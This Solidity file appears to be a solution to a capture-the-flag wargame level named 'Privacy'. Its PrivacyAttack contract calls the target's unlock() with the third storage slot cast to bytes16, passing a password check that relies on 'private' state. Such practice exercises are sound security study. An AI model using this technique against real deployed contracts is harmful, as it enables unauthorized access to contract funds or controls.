pragma solidity ^0.6.0;

import "../12-privacy/Privacy.sol";

contract PrivacyAttack {
    Privacy privacy;

  function attack(address target, bytes32[3] memory _data) public {
      privacy = Privacy(target);
      privacy.unlock(bytes16(_data[2]));
  }

}
